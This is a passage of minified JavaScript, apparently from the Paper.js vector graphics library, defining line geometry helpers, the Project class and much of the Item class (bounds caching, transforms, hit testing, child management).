                var r = !1;
                arguments.length >= 4 ? ((this._px = t), (this._py = e), (this._vx = i), (this._vy = n), (r = s)) : ((this._px = t.x), (this._py = t.y), (this._vx = e.x), (this._vy = e.y), (r = i)),
                    r || ((this._vx -= this._px), (this._vy -= this._py));
            },
            getPoint: function () {
                return new c(this._px, this._py);
            },
            getVector: function () {
                return new c(this._vx, this._vy);
            },
            getLength: function () {
                return this.getVector().getLength();
            },
            intersect: function (t, e) {
                return _.intersect(this._px, this._py, this._vx, this._vy, t._px, t._py, t._vx, t._vy, !0, e);
            },
            getSide: function (t, e) {
                return _.getSide(this._px, this._py, this._vx, this._vy, t.x, t.y, !0, e);
            },
            getDistance: function (t) {
                return Math.abs(this.getSignedDistance(t));
            },
            getSignedDistance: function (t) {
                return _.getSignedDistance(this._px, this._py, this._vx, this._vy, t.x, t.y, !0);
            },
            isCollinear: function (t) {
                return c.isCollinear(this._vx, this._vy, t._vx, t._vy);
            },
            isOrthogonal: function (t) {
                return c.isOrthogonal(this._vx, this._vy, t._vx, t._vy);
            },
            statics: {
                intersect: function (t, e, i, n, s, r, o, a, l, u) {
                    l || ((i -= t), (n -= e), (o -= s), (a -= r));
                    var d = i * a - n * o;
                    if (!h.isZero(d)) {
                        var f = t - s,
                            p = e - r,
                            g = (o * p - a * f) / d,
                            v = (i * p - n * f) / d;
                        if (u || (-1e-12 < g && g < 1 + 1e-12 && -1e-12 < v && v < 1 + 1e-12)) return u || (g = g <= 0 ? 0 : g >= 1 ? 1 : g), new c(t + g * i, e + g * n);
                    }
                },
                getSide: function (t, e, i, n, s, r, o, a) {
                    o || ((i -= t), (n -= e));
                    var l = s - t,
                        u = l * n - (r - e) * i;
                    return !a && h.isZero(u) && (u = (l * i + l * i) / (i * i + n * n)) >= 0 && u <= 1 && (u = 0), u < 0 ? -1 : u > 0 ? 1 : 0;
                },
                getSignedDistance: function (t, e, i, n, s, r, o) {
                    return o || ((i -= t), (n -= e)), 0 === i ? (n > 0 ? s - t : t - s) : 0 === n ? (i < 0 ? r - e : e - r) : ((s - t) * n - (r - e) * i) / Math.sqrt(i * i + n * n);
                },
                getDistance: function (t, e, i, n, s, r, o) {
                    return Math.abs(_.getSignedDistance(t, e, i, n, s, r, o));
                },
            },
        }),
        y = a.extend({
            _class: "Project",
            _list: "projects",
            _reference: "project",
            _compactSerialize: !0,
            initialize: function (t) {
                a.call(this, !0),
                    (this._children = []),
                    (this._namedChildren = {}),
                    (this._activeLayer = null),
                    (this._currentStyle = new q(null, null, this)),
                    (this._view = V.create(this, t || tt.getCanvas(1, 1))),
                    (this._selectionItems = {}),
                    (this._selectionCount = 0),
                    (this._updateVersion = 0);
            },
            _serialize: function (t, e) {
                return s.serialize(this._children, t, !0, e);
            },
            _changed: function (t, e) {
                if (1 & t) {
                    var i = this._view;
                    i && ((i._needsUpdate = !0), !i._requested && i._autoUpdate && i.requestUpdate());
                }
                var n = this._changes;
                if (n && e) {
                    var s = this._changesById,
                        r = e._id,
                        o = s[r];
                    o ? (o.flags |= t) : n.push((s[r] = { item: e, flags: t }));
                }
            },
            clear: function () {
                for (var t = this._children, e = t.length - 1; e >= 0; e--) t[e].remove();
            },
            isEmpty: function () {
                return !this._children.length;
            },
            remove: function t() {
                return !!t.base.call(this) && (this._view && this._view.remove(), !0);
            },
            getView: function () {
                return this._view;
            },
            getCurrentStyle: function () {
                return this._currentStyle;
            },
            setCurrentStyle: function (t) {
                this._currentStyle.set(t);
            },
            getIndex: function () {
                return this._index;
            },
            getOptions: function () {
                return this._scope.settings;
            },
            getLayers: function () {
                return this._children;
            },
            getActiveLayer: function () {
                return this._activeLayer || new b({ project: this, insert: !0 });
            },
            getSymbolDefinitions: function () {
                var t = [],
                    e = {};
                return (
                    this.getItems({
                        class: T,
                        match: function (i) {
                            var n = i._definition,
                                s = n._id;
                            return e[s] || ((e[s] = !0), t.push(n)), !1;
                        },
                    }),
                    t
                );
            },
            getSymbols: "getSymbolDefinitions",
            getSelectedItems: function () {
                var t = this._selectionItems,
                    e = [];
                for (var i in t) {
                    var n = t[i],
                        s = n._selection;
                    1 & s && n.isInserted() ? e.push(n) : s || this._updateSelection(n);
                }
                return e;
            },
            _updateSelection: function (t) {
                var e = t._id,
                    i = this._selectionItems;
                t._selection ? i[e] !== t && (this._selectionCount++, (i[e] = t)) : i[e] === t && (this._selectionCount--, delete i[e]);
            },
            selectAll: function () {
                for (var t = this._children, e = 0, i = t.length; e < i; e++) t[e].setFullySelected(!0);
            },
            deselectAll: function () {
                var t = this._selectionItems;
                for (var e in t) t[e].setFullySelected(!1);
            },
            addLayer: function (t) {
                return this.insertLayer(e, t);
            },
            insertLayer: function (t, e) {
                if (e instanceof b) {
                    e._remove(!1, !0), s.splice(this._children, [e], t, 0), e._setProject(this, !0);
                    var i = e._name;
                    i && e.setName(i), this._changes && e._changed(5), this._activeLayer || (this._activeLayer = e);
                } else e = null;
                return e;
            },
            _insertItem: function (t, i, n) {
                return (i = this.insertLayer(t, i) || (this._activeLayer || this._insertItem(e, new b(w.NO_INSERT), !0)).insertChild(t, i)), n && i.activate && i.activate(), i;
            },
            getItems: function (t) {
                return w._getItems(this, t);
            },
            getItem: function (t) {
                return w._getItems(this, t, null, null, !0)[0] || null;
            },
            importJSON: function (t) {
                this.activate();
                var e = this._activeLayer;
                return s.importJSON(t, e && e.isEmpty() && e);
            },
            removeOn: function (t) {
                var e = this._removeSets;
                if (e) {
                    "mouseup" === t && (e.mousedrag = null);
                    var i = e[t];
                    if (i) {
                        for (var n in i) {
                            var s = i[n];
                            for (var r in e) {
                                var o = e[r];
                                o && o != i && delete o[s._id];
                            }
                            s.remove();
                        }
                        e[t] = null;
                    }
                }
            },
            draw: function (t, e, i) {
                this._updateVersion++, t.save(), e.applyToContext(t);
                for (var n = this._children, r = new s({ offset: new c(0, 0), pixelRatio: i, viewMatrix: e.isIdentity() ? null : e, matrices: [new m()], updateMatrix: !0 }), o = 0, a = n.length; o < a; o++) n[o].draw(t, r);
                if ((t.restore(), this._selectionCount > 0)) {
                    t.save(), (t.strokeWidth = 1);
                    var l = this._selectionItems,
                        h = this._scope.settings.handleSize,
                        u = this._updateVersion;
                    for (var d in l) l[d]._drawSelection(t, e, h, l, u);
                    t.restore();
                }
            },
        }),
        w = s.extend(
            r,
            {
                statics: {
                    extend: function t(e) {
                        return e._serializeFields && (e._serializeFields = s.set({}, this.prototype._serializeFields, e._serializeFields)), t.base.apply(this, arguments);
                    },
                    NO_INSERT: { insert: !1 },
                },
                _class: "Item",
                _name: null,
                _applyMatrix: !0,
                _canApplyMatrix: !0,
                _canScaleStroke: !1,
                _pivot: null,
                _visible: !0,
                _blendMode: "normal",
                _opacity: 1,
                _locked: !1,
                _guide: !1,
                _clipMask: !1,
                _selection: 0,
                _selectBounds: !0,
                _selectChildren: !1,
                _serializeFields: { name: null, applyMatrix: null, matrix: new m(), pivot: null, visible: !0, blendMode: "normal", opacity: 1, locked: !1, guide: !1, clipMask: !1, selected: !1, data: {} },
                _prioritize: ["applyMatrix"],
            },
            new (function () {
                var t = ["onMouseDown", "onMouseUp", "onMouseDrag", "onClick", "onDoubleClick", "onMouseMove", "onMouseEnter", "onMouseLeave"];
                return s.each(
                    t,
                    function (t) {
                        this._events[t] = {
                            install: function (t) {
                                this.getView()._countItemEvent(t, 1);
                            },
                            uninstall: function (t) {
                                this.getView()._countItemEvent(t, -1);
                            },
                        };
                    },
                    {
                        _events: {
                            onFrame: {
                                install: function () {
                                    this.getView()._animateItem(this, !0);
                                },
                                uninstall: function () {
                                    this.getView()._animateItem(this, !1);
                                },
                            },
                            onLoad: {},
                            onError: {},
                        },
                        statics: { _itemHandlers: t },
                    }
                );
            })(),
            {
                initialize: function () {},
                _initialize: function (t, i) {
                    var n = t && s.isPlainObject(t),
                        r = n && !0 === t.internal,
                        o = (this._matrix = new m()),
                        a = (n && t.project) || st.project,
                        l = st.settings;
                    return (
                        (this._id = r ? null : u.get()),
                        (this._parent = this._index = null),
                        (this._applyMatrix = this._canApplyMatrix && l.applyMatrix),
                        i && o.translate(i),
                        (o._owner = this),
                        (this._style = new q(a._currentStyle, this, a)),
                        r || (n && 0 == t.insert) || (!l.insertItems && (!n || !0 !== t.insert)) ? this._setProject(a) : ((n && t.parent) || a)._insertItem(e, this, !0),
                        n && t !== w.NO_INSERT && this.set(t, { internal: !0, insert: !0, project: !0, parent: !0 }),
                        n
                    );
                },
                _serialize: function (t, e) {
                    var i = {},
                        n = this;
                    function r(r) {
                        for (var o in r) {
                            var a = n[o];
                            s.equals(a, "leading" === o ? 1.2 * r.fontSize : r[o]) || (i[o] = s.serialize(a, t, "data" !== o, e));
                        }
                    }
                    return r(this._serializeFields), this instanceof x || r(this._style._defaults), [this._class, i];
                },
                _changed: function (t) {
                    var i = this._symbol,
                        n = this._parent || i,
                        s = this._project;
                    8 & t && (this._bounds = this._position = this._decomposed = e),
                        16 & t && (this._globalMatrix = e),
                        n && 72 & t && w._clearBoundsCache(n),
                        2 & t && w._clearBoundsCache(this),
                        s && s._changed(t, this),
                        i && i._changed(t);
                },
                getId: function () {
                    return this._id;
                },
                getName: function () {
                    return this._name;
                },
                setName: function (t) {
                    if ((this._name && this._removeNamed(), t === +t + "")) throw new Error("Names consisting only of numbers are not supported.");
                    var i = this._getOwner();
                    if (t && i) {
                        var n = i._children,
                            s = i._namedChildren;
                        (s[t] = s[t] || []).push(this), t in n || (n[t] = this);
                    }
                    (this._name = t || e), this._changed(256);
                },
                getStyle: function () {
                    return this._style;
                },
                setStyle: function (t) {
                    this.getStyle().set(t);
                },
            },
            s.each(
                ["locked", "visible", "blendMode", "opacity", "guide"],
                function (t) {
                    var e = s.capitalize(t),
                        i = "_" + t,
                        n = { locked: 256, visible: 265 };
                    (this["get" + e] = function () {
                        return this[i];
                    }),
                        (this["set" + e] = function (e) {
                            e != this[i] && ((this[i] = e), this._changed(n[t] || 257));
                        });
                },
                {}
            ),
            {
                beans: !0,
                getSelection: function () {
                    return this._selection;
                },
                setSelection: function (t) {
                    if (t !== this._selection) {
                        this._selection = t;
                        var e = this._project;
                        e && (e._updateSelection(this), this._changed(257));
                    }
                },
                _changeSelection: function (t, e) {
                    var i = this._selection;
                    this.setSelection(e ? i | t : i & ~t);
                },
                isSelected: function () {
                    if (this._selectChildren) for (var t = this._children, e = 0, i = t.length; e < i; e++) if (t[e].isSelected()) return !0;
                    return !!(1 & this._selection);
                },
                setSelected: function (t) {
                    if (this._selectChildren) for (var e = this._children, i = 0, n = e.length; i < n; i++) e[i].setSelected(t);
                    this._changeSelection(1, t);
                },
                isFullySelected: function () {
                    var t = this._children,
                        e = !!(1 & this._selection);
                    if (t && e) {
                        for (var i = 0, n = t.length; i < n; i++) if (!t[i].isFullySelected()) return !1;
                        return !0;
                    }
                    return e;
                },
                setFullySelected: function (t) {
                    var e = this._children;
                    if (e) for (var i = 0, n = e.length; i < n; i++) e[i].setFullySelected(t);
                    this._changeSelection(1, t);
                },
                isClipMask: function () {
                    return this._clipMask;
                },
                setClipMask: function (t) {
                    this._clipMask != (t = !!t) && ((this._clipMask = t), t && (this.setFillColor(null), this.setStrokeColor(null)), this._changed(257), this._parent && this._parent._changed(2048));
                },
                getData: function () {
                    return this._data || (this._data = {}), this._data;
                },
                setData: function (t) {
                    this._data = t;
                },
                getPosition: function (t) {
                    var e = t ? c : d,
                        i = this._position || (this._position = this._getPositionFromBounds());
                    return new e(i.x, i.y, this, "setPosition");
                },
                setPosition: function () {
                    this.translate(c.read(arguments).subtract(this.getPosition(!0)));
                },
                _getPositionFromBounds: function (t) {
                    return this._pivot ? this._matrix._transformPoint(this._pivot) : (t || this.getBounds()).getCenter(!0);
                },
                getPivot: function () {
                    var t = this._pivot;
                    return t ? new d(t.x, t.y, this, "setPivot") : null;
                },
                setPivot: function () {
                    (this._pivot = c.read(arguments, 0, { clone: !0, readNull: !0 })), (this._position = e);
                },
            },
            s.each(
                { getStrokeBounds: { stroke: !0 }, getHandleBounds: { handle: !0 }, getInternalBounds: { internal: !0 } },
                function (t, e) {
                    this[e] = function (e) {
                        return this.getBounds(e, t);
                    };
                },
                {
                    beans: !0,
                    getBounds: function (t, e) {
                        var i = e || t instanceof m,
                            n = s.set({}, i ? e : t, this._boundsOptions);
                        (n.stroke && !this.getStrokeScaling()) || (n.cacheItem = this);
                        var r = this._getCachedBounds(i && t, n).rect;
                        return arguments.length ? r : new v(r.x, r.y, r.width, r.height, this, "setBounds");
                    },
                    setBounds: function () {
                        var t = g.read(arguments),
                            e = this.getBounds(),
                            i = this._matrix,
                            n = new m(),
                            s = t.getCenter();
                        n.translate(s),
                            (t.width == e.width && t.height == e.height) ||
                                (i.isInvertible() || (i.set(i._backup || new m().translate(i.getTranslation())), (e = this.getBounds())), n.scale(0 !== e.width ? t.width / e.width : 0, 0 !== e.height ? t.height / e.height : 0)),
                            (s = e.getCenter()),
                            n.translate(-s.x, -s.y),
                            this.transform(n);
                    },
                    _getBounds: function (t, e) {
                        var i = this._children;
                        return i && i.length ? (w._updateBoundsCache(this, e.cacheItem), w._getBounds(i, t, e)) : new g();
                    },
                    _getBoundsCacheKey: function (t, e) {
                        return [t.stroke ? 1 : 0, t.handle ? 1 : 0, e ? 1 : 0].join("");
                    },
                    _getCachedBounds: function (t, e, i) {
                        t = t && t._orNullIfIdentity();
                        var n = e.internal && !i,
                            s = e.cacheItem,
                            r = n ? null : this._matrix._orNullIfIdentity(),
                            o = s && (!t || t.equals(r)) && this._getBoundsCacheKey(e, n),
                            a = this._bounds;
                        if ((w._updateBoundsCache(this._parent || this._symbol, s), o && a && o in a)) return { rect: (d = a[o]).rect.clone(), nonscaling: d.nonscaling };
                        var l = this._getBounds(t || r, e),
                            h = l.rect || l,
                            u = this._style,
                            c = l.nonscaling || (u.hasStroke() && !u.getStrokeScaling());
                        if (o) {
                            a || (this._bounds = a = {});
                            var d = (a[o] = { rect: h.clone(), nonscaling: c, internal: n });
                        }
                        return { rect: h, nonscaling: c };
                    },
                    _getStrokeMatrix: function (t, e) {
                        var i = this.getStrokeScaling() ? null : e && e.internal ? this : this._parent || (this._symbol && this._symbol._item),
                            n = i ? i.getViewMatrix().invert() : t;
                        return n && n._shiftless();
                    },
                    statics: {
                        _updateBoundsCache: function (t, e) {
                            if (t && e) {
                                var i = e._id,
                                    n = (t._boundsCache = t._boundsCache || { ids: {}, list: [] });
                                n.ids[i] || (n.list.push(e), (n.ids[i] = e));
                            }
                        },
                        _clearBoundsCache: function (t) {
                            var i = t._boundsCache;
                            if (i) {
                                t._bounds = t._position = t._boundsCache = e;
                                for (var n = 0, s = i.list, r = s.length; n < r; n++) {
                                    var o = s[n];
                                    o !== t && ((o._bounds = o._position = e), o._boundsCache && w._clearBoundsCache(o));
                                }
                            }
                        },
                        _getBounds: function (t, e, i) {
                            var n = 1 / 0,
                                s = -n,
                                r = n,
                                o = s,
                                a = !1;
                            i = i || {};
                            for (var l = 0, h = t.length; l < h; l++) {
                                var u = t[l];
                                if (u._visible && !u.isEmpty()) {
                                    var c = u._getCachedBounds(e && e.appended(u._matrix), i, !0),
                                        d = c.rect;
                                    (n = Math.min(d.x, n)), (r = Math.min(d.y, r)), (s = Math.max(d.x + d.width, s)), (o = Math.max(d.y + d.height, o)), c.nonscaling && (a = !0);
                                }
                            }
                            return { rect: isFinite(n) ? new g(n, r, s - n, o - r) : new g(), nonscaling: a };
                        },
                    },
                }
            ),
            {
                beans: !0,
                _decompose: function () {
                    return this._applyMatrix ? null : this._decomposed || (this._decomposed = this._matrix.decompose());
                },
                getRotation: function () {
                    var t = this._decompose();
                    return t ? t.rotation : 0;
                },
                setRotation: function (t) {
                    var e = this.getRotation();
                    if (null != e && null != t) {
                        var i = this._decomposed;
                        this.rotate(t - e), i && ((i.rotation = t), (this._decomposed = i));
                    }
                },
                getScaling: function () {
                    var t = this._decompose(),
                        e = t && t.scaling;
                    return new d(e ? e.x : 1, e ? e.y : 1, this, "setScaling");
                },
                setScaling: function () {
                    var t = this.getScaling(),
                        e = c.read(arguments, 0, { clone: !0, readNull: !0 });
                    if (t && e && !t.equals(e)) {
                        var i = this.getRotation(),
                            n = this._decomposed,
                            s = new m(),
                            r = this.getPosition(!0);
                        s.translate(r), i && s.rotate(i), s.scale(e.x / t.x, e.y / t.y), i && s.rotate(-i), s.translate(r.negate()), this.transform(s), n && ((n.scaling = e), (this._decomposed = n));
                    }
                },
                getMatrix: function () {
                    return this._matrix;
                },
                setMatrix: function () {
                    var t = this._matrix;
                    t.initialize.apply(t, arguments);
                },
                getGlobalMatrix: function (t) {
                    var e = this._globalMatrix;
                    if (e)
                        for (var i = this._parent, n = []; i; ) {
                            if (!i._globalMatrix) {
                                e = null;
                                for (var s = 0, r = n.length; s < r; s++) n[s]._globalMatrix = null;
                                break;
                            }
                            n.push(i), (i = i._parent);
                        }
                    e || ((e = this._globalMatrix = this._matrix.clone()), (i = this._parent) && e.prepend(i.getGlobalMatrix(!0)));
                    return t ? e : e.clone();
                },
                getViewMatrix: function () {
                    return this.getGlobalMatrix().prepend(this.getView()._matrix);
                },
                getApplyMatrix: function () {
                    return this._applyMatrix;
                },
                setApplyMatrix: function (t) {
                    (this._applyMatrix = this._canApplyMatrix && !!t) && this.transform(null, !0);
                },
                getTransformContent: "#getApplyMatrix",
                setTransformContent: "#setApplyMatrix",
            },
            {
                getProject: function () {
                    return this._project;
                },
                _setProject: function (t, e) {
                    if (this._project !== t) {
                        this._project && this._installEvents(!1), (this._project = t);
                        for (var i = this._children, n = 0, s = i && i.length; n < s; n++) i[n]._setProject(t);
                        e = !0;
                    }
                    e && this._installEvents(!0);
                },
                getView: function () {
                    return this._project._view;
                },
                _installEvents: function t(e) {
                    t.base.call(this, e);
                    for (var i = this._children, n = 0, s = i && i.length; n < s; n++) i[n]._installEvents(e);
                },
                getLayer: function () {
                    for (var t = this; (t = t._parent); ) if (t instanceof b) return t;
                    return null;
                },
                getParent: function () {
                    return this._parent;
                },
                setParent: function (t) {
                    return t.addChild(this);
                },
                _getOwner: "#getParent",
                getChildren: function () {
                    return this._children;
                },
                setChildren: function (t) {
                    this.removeChildren(), this.addChildren(t);
                },
                getFirstChild: function () {
                    return (this._children && this._children[0]) || null;
                },
                getLastChild: function () {
                    return (this._children && this._children[this._children.length - 1]) || null;
                },
                getNextSibling: function () {
                    var t = this._getOwner();
                    return (t && t._children[this._index + 1]) || null;
                },
                getPreviousSibling: function () {
                    var t = this._getOwner();
                    return (t && t._children[this._index - 1]) || null;
                },
                getIndex: function () {
                    return this._index;
                },
                equals: function (t) {
                    return (
                        t === this ||
                        (t &&
                            this._class === t._class &&
                            this._style.equals(t._style) &&
                            this._matrix.equals(t._matrix) &&
                            this._locked === t._locked &&
                            this._visible === t._visible &&
                            this._blendMode === t._blendMode &&
                            this._opacity === t._opacity &&
                            this._clipMask === t._clipMask &&
                            this._guide === t._guide &&
                            this._equals(t)) ||
                        !1
                    );
                },
                _equals: function (t) {
                    return s.equals(this._children, t._children);
                },
                clone: function (t) {
                    var i = new this.constructor(w.NO_INSERT),
                        n = this._children,
                        r = s.pick(t ? t.insert : e, t === e || !0 === t),
                        o = s.pick(t ? t.deep : e, !0);
                    n && i.copyAttributes(this), (n && !o) || i.copyContent(this), n || i.copyAttributes(this), r && i.insertAbove(this);
                    var a = this._name,
                        l = this._parent;
                    if (a && l) {
                        n = l._children;
                        for (var h = a, u = 1; n[a]; ) a = h + " " + u++;
                        a !== h && i.setName(a);
                    }
                    return i;
                },
                copyContent: function (t) {
                    for (var e = t._children, i = 0, n = e && e.length; i < n; i++) this.addChild(e[i].clone(!1), !0);
                },
                copyAttributes: function (t, e) {
                    this.setStyle(t._style);
                    for (var i = ["_locked", "_visible", "_blendMode", "_opacity", "_clipMask", "_guide"], n = 0, r = i.length; n < r; n++) {
                        var o = i[n];
                        t.hasOwnProperty(o) && (this[o] = t[o]);
                    }
                    e || this._matrix.set(t._matrix, !0), this.setApplyMatrix(t._applyMatrix), this.setPivot(t._pivot), this.setSelection(t._selection);
                    var a = t._data,
                        l = t._name;
                    (this._data = a ? s.clone(a) : null), l && this.setName(l);
                },
                rasterize: function (t, i) {
                    var n = this.getStrokeBounds(),
                        r = (t || this.getView().getResolution()) / 72,
                        o = n.getTopLeft().floor(),
                        a = n.getBottomRight().ceil(),
                        l = new f(a.subtract(o)),
                        h = new C(w.NO_INSERT);
                    if (!l.isZero()) {
                        var u = tt.getCanvas(l.multiply(r)),
                            c = u.getContext("2d"),
                            d = new m().scale(r).translate(o.negate());
                        c.save(), d.applyToContext(c), this.draw(c, new s({ matrices: [d] })), c.restore(), h.setCanvas(u);
                    }
                    return h.transform(new m().translate(o.add(l.divide(2))).scale(1 / r)), (i === e || i) && h.insertAbove(this), h;
                },
                contains: function () {
                    return !!this._contains(this._matrix._inverseTransform(c.read(arguments)));
                },
                _contains: function (t) {
                    var e = this._children;
                    if (e) {
                        for (var i = e.length - 1; i >= 0; i--) if (e[i].contains(t)) return !0;
                        return !1;
                    }
                    return t.isInside(this.getInternalBounds());
                },
                isInside: function () {
                    return g.read(arguments).contains(this.getBounds());
                },
                _asPathItem: function () {
                    return new E.Rectangle({ rectangle: this.getInternalBounds(), matrix: this._matrix, insert: !1 });
                },
                intersects: function (t, e) {
                    return t instanceof w && this._asPathItem().getIntersections(t._asPathItem(), null, e, !0).length > 0;
                },
            },
            new (function () {
                function t() {
                    return this._hitTest(c.read(arguments), I.getOptions(arguments));
                }
                function e() {
                    var t = c.read(arguments),
                        e = I.getOptions(arguments),
                        i = [];
                    return this._hitTest(t, s.set({ all: i }, e)), i;
                }
                function i(t, e, i, n) {
                    var s = this._children;
                    if (s)
                        for (var r = s.length - 1; r >= 0; r--) {
                            var o = s[r],
                                a = o !== n && o._hitTest(t, e, i);
                            if (a && !e.all) return a;
                        }
                    return null;
                }
                return y.inject({ hitTest: t, hitTestAll: e, _hitTest: i }), { hitTest: t, hitTestAll: e, _hitTestChildren: i };
            })(),
            {
                _hitTest: function (t, e, i) {
                    if (this._locked || !this._visible || (this._guide && !e.guides) || this.isEmpty()) return null;
                    var n = this._matrix,
                        r = i ? i.appended(n) : this.getGlobalMatrix().prepend(this.getView()._matrix),
                        o = Math.max(e.tolerance, 1e-12),
                        a = (e._tolerancePadding = new f(E._getStrokePadding(o, n._shiftless().invert())));
                    if (!(t = n._inverseTransform(t)) || (!this._children && !this.getBounds({ internal: !0, stroke: !0, handle: !0 }).expand(a.multiply(2))._containsPoint(t))) return null;
                    var l,
                        h,
                        u = !((e.guides && !this._guide) || (e.selected && !this.isSelected()) || (e.type && e.type !== s.hyphenate(this._class)) || (e.class && !(this instanceof e.class))),
                        c = e.match,
                        d = this;
                    function p(t) {
                        return t && c && !c(t) && (t = null), t && e.all && e.all.push(t), t;
                    }
                    function g(e, i) {
                        var n = i ? l["get" + i]() : d.getPosition();
                        if (t.subtract(n).divide(a).length <= 1) return new I(e, d, { name: i ? s.hyphenate(i) : e, point: n });
                    }
                    var v = e.position,
                        m = e.center,
                        _ = e.bounds;
                    if (u && this._parent && (v || m || _)) {
                        if (((m || _) && (l = this.getInternalBounds()), !(h = (v && g("position")) || (m && g("center", "Center"))) && _))
                            for (var y = ["TopLeft", "TopRight", "BottomLeft", "BottomRight", "LeftCenter", "TopCenter", "RightCenter", "BottomCenter"], w = 0; w < 8 && !h; w++) h = g("bounds", y[w]);
                        h = p(h);
                    }
                    return h || (h = this._hitTestChildren(t, e, r) || (u && p(this._hitTestSelf(t, e, r, this.getStrokeScaling() ? null : r._shiftless().invert()))) || null), h && h.point && (h.point = n.transform(h.point)), h;
                },
                _hitTestSelf: function (t, e) {
                    if (e.fill && this.hasFill() && this._contains(t)) return new I("fill", this);
                },
                matches: function (t, e) {
                    var i = typeof t;
                    if ("object" === i) {
                        for (var n in t) if (t.hasOwnProperty(n) && !this.matches(n, t[n])) return !1;
                        return !0;
                    }
                    if ("function" === i) return t(this);
                    if ("match" === t) return e(this);
                    var r = /^(empty|editable)$/.test(t) ? this["is" + s.capitalize(t)]() : "type" === t ? s.hyphenate(this._class) : this[t];
                    if ("class" === t) {
                        if ("function" == typeof e) return this instanceof e;
                        r = this._class;
                    }
                    if ("function" == typeof e) return !!e(r);
                    if (e) {
                        if (e.test) return e.test(r);
                        if (s.isPlainObject(e))
                            return (function t(e, i) {
                                for (var n in e)
                                    if (e.hasOwnProperty(n)) {
                                        var r = e[n],
                                            o = i[n];
                                        if (s.isPlainObject(r) && s.isPlainObject(o)) {
                                            if (!t(r, o)) return !1;
                                        } else if (!s.equals(r, o)) return !1;
                                    }
                                return !0;
                            })(e, r);
                    }
                    return s.equals(r, e);
                },
                getItems: function (t) {
                    return w._getItems(this, t, this._matrix);
                },
                getItem: function (t) {
                    return w._getItems(this, t, this._matrix, null, !0)[0] || null;
                },
                statics: {
                    _getItems: function t(e, i, n, r, o) {
                        if (!r) {
                            var a = "object" == typeof i && i,
                                l = a && a.overlapping,
                                h = a && a.inside,
                                u = (w = l || h) && g.read([w]);
                            (r = { items: [], recursive: a && !1 !== a.recursive, inside: !!h, overlapping: !!l, rect: u, path: l && new E.Rectangle({ rectangle: u, insert: !1 }) }),
                                a && (i = s.filter({}, i, { recursive: !0, inside: !0, overlapping: !0 }));
                        }
                        var c = e._children,
                            d = r.items;
                        n = (u = r.rect) && (n || new m());
                        for (var f = 0, p = c && c.length; f < p; f++) {
                            var v = c[f],
                                _ = n && n.appended(v._matrix),
                                y = !0;
                            if (u) {
                                var w = v.getBounds(_);
                                if (!u.intersects(w)) continue;
                                u.contains(w) || (r.overlapping && (w.contains(u) || r.path.intersects(v, _))) || (y = !1);
                            }
                            if (y && v.matches(i) && (d.push(v), o)) break;
                            if ((!1 !== r.recursive && t(v, i, _, r, o), o && d.length > 0)) break;
                        }
                        return d;
                    },
                },
            },
            {
                importJSON: function (t) {
                    var e = s.importJSON(t, this);
                    return e !== this ? this.addChild(e) : e;
                },
                addChild: function (t) {
                    return this.insertChild(e, t);
                },
                insertChild: function (t, e) {
                    var i = e ? this.insertChildren(t, [e]) : null;
                    return i && i[0];
                },
                addChildren: function (t) {
                    return this.insertChildren(this._children.length, t);
                },
                insertChildren: function (t, e) {
                    var i = this._children;
                    if (i && e && e.length > 0) {
                        for (var n = {}, r = (e = s.slice(e)).length - 1; r >= 0; r--) {
                            var o = (u = e[r]) && u._id;
                            !u || n[o] ? e.splice(r, 1) : (u._remove(!1, !0), (n[o] = !0));
                        }
                        s.splice(i, e, t, 0);
                        for (var a = this._project, l = a._changes, h = ((r = 0), e.length); r < h; r++) {
                            var u,
                                c = (u = e[r])._name;
                            (u._parent = this), u._setProject(a, !0), c && u.setName(c), l && u._changed(5);
                        }
                        this._changed(11);
                    } else e = null;
                    return e;
                },
                _insertItem: "#insertChild",
                _insertAt: function (t, e) {
                    var i = t && t._getOwner(),
                        n = t !== this && i ? this : null;
                    return n && (n._remove(!1, !0), i._insertItem(t._index + e, n)), n;
                },
                insertAbove: function (t) {
                    return this._insertAt(t, 1);
                },
                insertBelow: function (t) {
                    return this._insertAt(t, 0);
                },
                sendToBack: function () {
                    var t = this._getOwner();
                    return t ? t._insertItem(0, this) : null;
                },
                bringToFront: function () {
                    var t = this._getOwner();
                    return t ? t._insertItem(e, this) : null;
                },
                appendTop: "#addChild",
                appendBottom: function (t) {
                    return this.insertChild(0, t);
                },
                moveAbove: "#insertAbove",
                moveBelow: "#insertBelow",
                addTo: function (t) {
                    return t._insertItem(e, this);
                },
                copyTo: function (t) {
                    return this.clone(!1).addTo(t);
                },
                reduce: function (t) {
                    var e = this._children;
                    if (e && 1 === e.length) {
                        var i = e[0].reduce(t);
                        return this._parent ? (i.insertAbove(this), this.remove()) : i.remove(), i;
                    }
                    return this;
                },
                _removeNamed: function () {
                    var t = this._getOwner();
                    if (t) {
                        var e = t._children,
                            i = t._namedChildren,
                            n = this._name,
                            s = i[n],
                            r = s ? s.indexOf(this) : -1;
                        -1 !== r && (e[n] == this && delete e[n], s.splice(r, 1), s.length ? (e[n] = s[0]) : delete i[n]);
                    }
                },
                _remove: function (t, e) {
                    var i = this._getOwner(),
                        n = this._project,
                        r = this._index;
                    return (
                        this._style && this._style._dispose(),
                        !!i &&
                            (this._name && this._removeNamed(),
                            null != r && (n._activeLayer === this && (n._activeLayer = this.getNextSibling() || this.getPreviousSibling()), s.splice(i._children, null, r, 1)),
                            this._installEvents(!1),
                            t && n._changes && this._changed(5),
                            e && i._changed(11, this),
                            (this._parent = null),
                            !0)
                    );
                },
                remove: function () {
                    return this._remove(!0, !0);
                },
                replaceWith: function (t) {
                    var e = t && t.insertBelow(this);
                    return e && this.remove(), e;
                },
                removeChildren: function (t, e) {
                    if (!this._children) return null;
                    (t = t || 0), (e = s.pick(e, this._children.length));
                    for (var i = s.splice(this._children, null, t, e - t), n = i.length - 1; n >= 0; n--) i[n]._remove(!0, !1);
                    return i.length > 0 && this._changed(11), i;
                },
                clear: "#removeChildren",
                reverseChildren: function () {
                    if (this._children) {
                        this._children.reverse();
                        for (var t = 0, e = this._children.length; t < e; t++) this._children[t]._index = t;
                        this._changed(11);
                    }
                },
                isEmpty: function () {
                    var t = this._children;
                    return !t || !t.length;
                },
                isEditable: function () {
                    for (var t = this; t; ) {
                        if (!t._visible || t._locked) return !1;
                        t = t._parent;
                    }
                    return !0;
                },
                hasFill: function () {
                    return this.getStyle().hasFill();
                },
                hasStroke: function () {
                    return this.getStyle().hasStroke();
                },
                hasShadow: function () {
                    return this.getStyle().hasShadow();
                },
                _getOrder: function (t) {
                    function e(t) {
                        for (var e = []; e.unshift(t), (t = t._parent); );
                        return e;
                    }
